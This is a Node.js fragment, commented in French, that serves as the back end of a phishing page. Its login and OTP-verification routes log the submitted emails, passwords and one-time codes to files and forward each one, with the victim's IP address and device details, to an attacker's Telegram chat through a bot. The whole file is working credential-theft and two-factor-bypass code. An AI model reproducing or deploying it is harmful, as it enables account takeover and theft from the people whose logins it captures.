const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

// Configuration Telegram
const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, {polling: true});
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Formatage des messages
function formatCredentials(data) {
  return `🔔 *Nouveaux Identifiants* 🔔
  
📧 *Email*: \`${data.email || 'Non fourni'}\`
🔑 *Mot de passe*: \`${data.password || 'Non fourni'}\`

🌐 *Adresse IP*: \`${data.ip}\`
🕒 *Date*: ${new Date(data.timestamp).toLocaleString()}
  
🛡️ *User Agent*: 
\`\`\`${data.userAgent}\`\`\``;
}

function formatOTP(data) {
  return `⚠️ *Code OTP Saisi* ⚠️

📧 *Email*: \`${data.email}\`
🔢 *Code*: \`${data.otp}\`

🌐 *IP*: \`${data.ip}\`
📱 *Device*: \`${data.userAgent.split('(')[1]?.split(')')[0] || 'Inconnu'}\``;
}

// Middleware pour Telegram
function sendTelegramAlert(data, isOTP = false) {
  if(process.env.TELEGRAM_ENABLED !== 'true') return;
  
  try {
    const text = isOTP ? formatOTP(data) : formatCredentials(data);
    bot.sendMessage(CHAT_ID, text, {parse_mode: 'Markdown'});
    
    // Envoi supplémentaire de l'adresse IP sur une carte
    if(data.ip) {
      bot.sendLocation(CHAT_ID, 0, 0, {
        live_period: 86400,
        reply_markup: {
          inline_keyboard: [[{
            text: `📍 Localiser IP ${data.ip}`,
            url: `https://www.ip2location.com/demo/${data.ip}`
          }]]
        }
      });
    }
  } catch (error) {
    console.error('Erreur Telegram:', error);
  }
}

// Modification des routes existantes
app.post('/login', (req, res) => {
  const data = req.body;
  fs.appendFileSync('./logs/credentials.log', JSON.stringify(data) + '\n');
  sendTelegramAlert(data);
  res.sendStatus(200);
});

app.post('/verify-otp', (req, res) => {
  fs.appendFileSync('./logs/otp_attempts.log', JSON.stringify(req.body) + '\n');
  sendTelegramAlert(req.body, true);
  res.sendStatus(200);
});
